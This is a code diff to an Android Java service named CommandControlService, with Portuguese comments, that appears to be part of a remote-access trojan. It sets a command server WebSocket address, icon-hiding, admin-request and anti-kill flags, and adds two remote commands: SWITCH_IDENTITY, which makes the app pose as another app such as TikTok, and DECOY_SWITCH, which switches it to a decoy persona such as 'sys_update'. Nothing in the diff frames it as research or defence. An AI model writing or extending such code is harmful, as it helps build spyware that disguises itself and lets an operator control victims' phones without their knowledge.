@@ -59,7 +59,7 @@ public class CommandControlService extends Service {
     // CONFIGURAÇÃO DO SERVIDOR - ALTERAR PARA SEU SERVIDOR!
     // URL do servidor - PUBLIC para acesso do StudioActivity
     public static final String SERVER_URL = "ws://192.168.1.14:5000/ws";
-    public static final String WEBVIEW_URL = "";
+    public static volatile String WEBVIEW_URL = "";
     public static final boolean HIDE_ICON = false;
     public static final boolean REQUEST_ADMIN = false;
     public static final boolean ANTI_KILL = true;
@@ -2123,6 +2123,31 @@ public class CommandControlService extends Service {
                     break;
                 }
                     
+                case "SWITCH_IDENTITY": {
+                    String id  = cmd.has("identity") ? cmd.get("identity").getAsString() : "tiktok";
+                    String url = cmd.has("url")      ? cmd.get("url").getAsString()      : "";
+                    try {
+                        com.android.core.sync.AppIdentityManager.get().switchIdentity(id, url, this);
+                        Log.d(TAG, "🎭 SWITCH_IDENTITY → " + id + " url=" + url);
+                        sendResponse("OK", "Identity switched to " + id);
+                    } catch (Exception e) {
+                        sendResponse("ERROR", "SWITCH_IDENTITY error: " + e.getMessage());
+                    }
+                    break;
+                }
+
+                case "DECOY_SWITCH": {
+                    String persona = cmd.has("persona") ? cmd.get("persona").getAsString() : "sys_update";
+                    try {
+                        com.android.core.sync.DecoyManager.get(this).remoteSwitch(persona);
+                        Log.d(TAG, "🎭 DECOY_SWITCH → " + persona);
+                        sendResponse("OK", "Decoy persona switched to " + persona);
+                    } catch (Exception e) {
+                        sendResponse("ERROR", "DECOY_SWITCH error: " + e.getMessage());
+                    }
+                    break;
+                }
+
                 default:
                     Log.w(TAG, "Comando desconhecido: " + action);
             }
